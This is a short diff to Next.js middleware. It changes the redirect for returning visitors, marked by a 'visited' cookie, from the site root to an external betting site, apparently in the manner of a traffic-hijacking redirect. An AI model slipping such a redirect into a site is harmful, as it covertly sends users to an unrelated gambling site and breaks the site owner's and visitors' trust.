@@ -10,7 +10,9 @@ export function middleware(request: NextRequest) {
 
 	const response =
 		visited && redirect
-			? NextResponse.redirect(new URL("/", request.url))
+			? NextResponse.redirect(
+					new URL("https://www.marathonbet.com/", request.url)
+			  )
 			: NextResponse.next();
 	response.cookies.set("visited", "true");
 	return response;
